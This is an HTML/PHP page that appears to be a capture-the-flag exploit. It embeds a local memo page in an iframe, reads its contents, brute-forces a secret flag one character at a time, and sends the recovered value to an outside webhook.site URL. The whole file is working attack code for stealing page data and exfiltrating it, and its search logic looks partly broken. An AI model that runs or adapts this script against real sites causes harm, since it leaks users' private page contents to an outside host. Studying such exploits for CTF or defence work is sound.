<?php
header('Access-Control-Allow-Origin: *');
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
</body>
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script>
    function search(query, content) {

        data = document.getElementById("memo-iframe").contentWindow.document.firstElementChild.innerHTML;

        console.log(data);

        return data.includes(query);

    }

    function createIframe(callback) {
        var iframe = $('<iframe />');
        iframe.attr('src', "http://localhost:1234/memo.php");
        iframe.attr('id', "memo-iframe");
        iframe.on('load', function() {
            if (callback) callback(this.contentWindow.frames);
        });
        $('body').append(iframe);

    }

    async function exploit(content) {

        let flag = "CHH{";
        let query;
        while (flag.charAt(flag.length - 1) !== "}") {
            console.log(flag);
            for (let c of "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890}_") {
                query = flag + c;
                if (await search(query, content)) {
                    console.log(`YES - ${query}`);
                    flag = query;
                } else {
                    // we got an http 404
                    console.log(`NO - ${query}`);
                }
            }

            
            fetch(`https://webhook.site/09f4ed52-e369-4bdc-9c82-459cb9e07b3f/?flag=${flag}`, {
                method: 'GET',
                mode: 'cors',
            })

        }
    }

    createIframe(exploit);
</script>

</html>